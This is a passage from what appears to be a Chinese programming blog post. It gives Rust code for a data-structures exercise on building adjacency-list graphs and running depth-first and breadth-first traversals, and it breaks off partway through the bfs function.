keyword">mut</span> <span class="token keyword">self</span> <span class="token punctuation">,</span> input <span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Edge</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> edge <span class="token keyword">in</span> input <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> in_v <span class="token operator">=</span> edge<span class="token number">.0</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> ex_v <span class="token operator">=</span> edge<span class="token number">.1</span><span class="token punctuation">;</span>            <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;插入"</span><span class="token punctuation">,</span>in_v<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>in_v<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>edge<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">create_unorder</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span> <span class="token punctuation">,</span> input <span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Edge</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> edge <span class="token keyword">in</span> input <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> in_v <span class="token operator">=</span> edge<span class="token number">.0</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> ex_v <span class="token operator">=</span> edge<span class="token number">.1</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;插入"</span><span class="token punctuation">,</span>in_v<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>in_v<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>edge<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>ex_v<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>edge<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">print</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> v <span class="token keyword">in</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>vertices<span class="token punctuation">&#123;</span>            v<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">Head</span><span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Head</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Head</span><span class="token punctuation">&#123;</span>len<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>first<span class="token punctuation">:</span><span class="token class-name">None</span><span class="token punctuation">,</span>index<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> edge<span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token class-name">Edge</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span>edge<span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> index <span class="token punctuation">:</span> <span class="token keyword">usize</span> <span class="token operator">=</span> edge<span class="token number">.1</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> weight <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 不涉及，默认</span>        <span class="token comment">//处理为空</span>        <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">&#123;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>first <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Node</span><span class="token punctuation">&#123;</span>weight<span class="token punctuation">,</span>index<span class="token punctuation">,</span>next<span class="token punctuation">:</span><span class="token class-name">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 处理仅有一个节点但是不访问第二个节点</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">ref</span> <span class="token keyword">mut</span> first_node<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> first_node<span class="token punctuation">.</span>index <span class="token operator">></span> index <span class="token punctuation">&#123;</span>                <span class="token keyword">let</span> new_node <span class="token operator">=</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>                    weight<span class="token punctuation">,</span>                    index<span class="token punctuation">,</span>                    next<span class="token punctuation">:</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>                <span class="token keyword">self</span><span class="token punctuation">.</span>first <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> first_node<span class="token punctuation">.</span>index <span class="token operator">==</span> index <span class="token punctuation">&#123;</span>                <span class="token comment">// 重复索引，不处理</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current<span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">ref</span> next_node<span class="token punctuation">)</span> <span class="token operator">=</span> node<span class="token punctuation">.</span>next <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> next_node<span class="token punctuation">.</span>index <span class="token operator">==</span> index <span class="token punctuation">&#123;</span>                    <span class="token comment">// 重复索引，不处理</span>                    <span class="token keyword">return</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> next_node<span class="token punctuation">.</span>index <span class="token operator">></span> index <span class="token punctuation">&#123;</span>                    <span class="token comment">// 在当前位置插入</span>                    <span class="token keyword">let</span> new_node <span class="token operator">=</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>                        weight<span class="token punctuation">,</span>                        index<span class="token punctuation">,</span>                        next<span class="token punctuation">:</span> node<span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>                    node<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token comment">// 继续向后遍历</span>                current <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> node<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 到达链表末尾，在末尾插入</span>                <span class="token keyword">let</span> new_node <span class="token operator">=</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>                    weight<span class="token punctuation">,</span>                    index<span class="token punctuation">,</span>                    next<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>                node<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">print</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"顶点&#123;&#125;通向的边有："</span><span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current<span class="token punctuation">&#123;</span>            <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125; "</span><span class="token punctuation">,</span>node<span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>            current <span class="token operator">=</span> <span class="token operator">&amp;</span>node<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">Edge</span><span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">reverse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Edge</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[cfg(test)]</span><span class="token keyword">mod</span> <span class="token module-declaration namespace">test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token keyword">super</span><span class="token punctuation">::</span><span class="token punctuation">&#123;</span><span class="token class-name">Edge</span><span class="token punctuation">,</span> <span class="token class-name">Graph</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token attribute attr-name">#[test]</span>    <span class="token keyword">fn</span> <span class="token function-definition function">test_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> edges <span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Edge</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> g <span class="token operator">=</span> <span class="token class-name">Graph</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        g<span class="token punctuation">.</span><span class="token function">create_unorder</span><span class="token punctuation">(</span>edges<span class="token punctuation">)</span><span class="token punctuation">;</span>        g<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="图遍历的演示"><a href="#图遍历的演示" class="headerlink" title="图遍历的演示"></a>图遍历的演示</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="[问题描述]"></a>[问题描述]</h3><p>很多涉及图操作的算法都是以图的遍历操作为基础的。试写一个程序，演示无向图的遍历操作。</p><h3 id="基本要求"><a href="#基本要求" class="headerlink" title="[基本要求]"></a>[基本要求]</h3><p>以邻接表为存储结构，实现连通无向图的深度优先和广度优先遍历。以用户指定的结点为起点，分别输出每种遍历方式的结点访问序列和相应生成树的边集。</p><h3 id="测试数据"><a href="#测试数据" class="headerlink" title="[测试数据]"></a>[测试数据]</h3><p>依据软件工程的测试技术自己确定，注意测试边界数据，如单个结点。</p><h3 id="实现提示"><a href="#实现提示" class="headerlink" title="[实现提示]"></a>[实现提示]</h3><p>设图的结点不超过30个，每个结点用一个编号表示（如果一个图有n个结点，则它们的编号分别为1, 2, …, n）。通过输入图的全部边的方式输入一个图，每条边为一个数对，可以对边的输入顺序做出某种限制。注意，生成树的边是有向边，端点顺序不能颠倒。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>首先是dfs，需要额外的数据结构来记录节点被访问与结果，结果包括节点访问序列和生成树，需要处理好两种索引之间的转换</p><p>因为进入递归时没有调用者，所以需要caller是Option的<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">dfs</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> start<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">-></span> <span class="token punctuation">(</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Edge</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> visited <span class="token operator">=</span> <span class="token class-name">HashSet</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> result <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> spanning_tree <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">dfs_recursive</span><span class="token punctuation">(</span>start <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> visited<span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> result<span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> spanning_tree<span class="token punctuation">,</span> <span class="token class-name">None</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//输出</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> result<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125; "</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">(</span>result<span class="token punctuation">,</span> spanning_tree<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">fn</span> <span class="token function-definition function">dfs_recursive</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> node<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> visited<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">HashSet</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span><span class="token punctuation">,</span> result<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span><span class="token punctuation">,</span> spanning_tree<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Edge</span><span class="token operator">></span><span class="token punctuation">,</span> caller<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> visited<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>node<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    visited<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>    result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1-based 索引</span>    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>caller_node<span class="token punctuation">)</span> <span class="token operator">=</span> caller <span class="token punctuation">&#123;</span>        spanning_tree<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">Edge</span><span class="token punctuation">(</span>caller_node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 遍历所有邻居</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>node<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node_ptr<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> neighbor <span class="token operator">=</span> node_ptr<span class="token punctuation">.</span>index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 转换为 0-based 索引</span>        <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">dfs_recursive</span><span class="token punctuation">(</span>neighbor<span class="token punctuation">,</span> visited<span class="token punctuation">,</span> result<span class="token punctuation">,</span> spanning_tree<span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        current <span class="token operator">=</span> <span class="token operator">&amp;</span>node_ptr<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[test]</span><span class="token keyword">fn</span> <span class="token function-definition function">test_dfs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> edges<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Edge</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> g <span class="token operator">=</span> <span class="token class-name">Graph</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    g<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>edges<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> dfs_result <span class="token operator">=</span> g<span class="token punctuation">.</span><span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>dfs_result<span class="token punctuation">,</span><span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> expected_edges <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>dfs_result<span class="token number">.1</span><span class="token punctuation">,</span> expected_edges<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>然后是bfs，思路类似，同样用一个hashset记录visited，一个vec记录结果，把递归换成队列<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">bfs</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> start<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token punctuation">(</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Edge</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> visited <span class="token operator">=</span> <span class="token class-name">HashSet</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> queue <span class="token operator">=</span> <span class="token class-name">VecDeque</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> result <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 